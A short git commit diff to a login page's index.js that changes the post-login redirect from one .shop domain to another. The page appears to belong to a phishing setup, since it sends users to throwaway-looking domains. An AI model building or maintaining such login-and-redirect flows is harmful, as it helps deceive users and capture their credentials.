d06d499787db97bb59c5c142a3d9f0f0d1d02b3f
husknet <127146284+husknet@users.noreply.github.com>
2025-06-23 11:12:02 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://bq.nestconche.shop/';
+      window.location.href = 'https://blk.azuz-nutty.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
